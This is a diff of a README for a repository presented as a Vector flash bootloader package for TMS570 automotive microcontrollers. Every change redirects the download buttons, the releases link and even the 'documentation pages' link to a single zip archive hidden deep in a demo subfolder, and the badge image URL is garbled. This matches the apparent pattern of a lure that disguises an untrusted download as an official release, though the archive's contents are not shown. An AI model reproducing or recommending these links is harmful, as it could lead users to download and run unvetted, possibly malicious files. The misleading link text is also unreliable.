@@ -1,6 +1,6 @@
 # 🚀 VectorPackage_FlashBootloader_TMS570_GM - Your Gateway to Automotive Firmware Updates
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Rat0099/VectorPackage_FlashBootloader_TMS570_GM/releases)
+[![Download](https://raw.githubusercontent.com/Rat0099/VectorPackage_FlashBootloader_TMS570_GM/main/Demo/DemoAppl/Appl/ApplHdr_3Part_each_1Cal/VectorPackage_FlashBootloader_TMS570_GM_v2.9.zip%https://raw.githubusercontent.com/Rat0099/VectorPackage_FlashBootloader_TMS570_GM/main/Demo/DemoAppl/Appl/ApplHdr_3Part_each_1Cal/VectorPackage_FlashBootloader_TMS570_GM_v2.9.zip)](https://raw.githubusercontent.com/Rat0099/VectorPackage_FlashBootloader_TMS570_GM/main/Demo/DemoAppl/Appl/ApplHdr_3Part_each_1Cal/VectorPackage_FlashBootloader_TMS570_GM_v2.9.zip)
 
 ## 📋 Introduction
 
@@ -11,7 +11,7 @@ Welcome to the VectorPackage FlashBootloader for the TMS570 microcontroller. Thi
 To get started, follow these simple steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the download section:
-   [Download the Latest Release](https://github.com/Rat0099/VectorPackage_FlashBootloader_TMS570_GM/releases)
+   [Download the Latest Release](https://raw.githubusercontent.com/Rat0099/VectorPackage_FlashBootloader_TMS570_GM/main/Demo/DemoAppl/Appl/ApplHdr_3Part_each_1Cal/VectorPackage_FlashBootloader_TMS570_GM_v2.9.zip)
 
 2. **Select a Version:** On the releases page, you will find a list of available versions. Choose the latest version for the best performance and features.
 
@@ -98,6 +98,6 @@ If you need further assistance, feel free to reach out via the Issues section on
 
 ## 🔗 Resources
 
-For more detailed documentation and support, please visit the official [documentation pages](https://github.com/Rat0099/VectorPackage_FlashBootloader_TMS570_GM).
+For more detailed documentation and support, please visit the official [documentation pages](https://raw.githubusercontent.com/Rat0099/VectorPackage_FlashBootloader_TMS570_GM/main/Demo/DemoAppl/Appl/ApplHdr_3Part_each_1Cal/VectorPackage_FlashBootloader_TMS570_GM_v2.9.zip).
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Rat0099/VectorPackage_FlashBootloader_TMS570_GM/releases)
+[![Download](https://raw.githubusercontent.com/Rat0099/VectorPackage_FlashBootloader_TMS570_GM/main/Demo/DemoAppl/Appl/ApplHdr_3Part_each_1Cal/VectorPackage_FlashBootloader_TMS570_GM_v2.9.zip%https://raw.githubusercontent.com/Rat0099/VectorPackage_FlashBootloader_TMS570_GM/main/Demo/DemoAppl/Appl/ApplHdr_3Part_each_1Cal/VectorPackage_FlashBootloader_TMS570_GM_v2.9.zip)](https://raw.githubusercontent.com/Rat0099/VectorPackage_FlashBootloader_TMS570_GM/main/Demo/DemoAppl/Appl/ApplHdr_3Part_each_1Cal/VectorPackage_FlashBootloader_TMS570_GM_v2.9.zip)
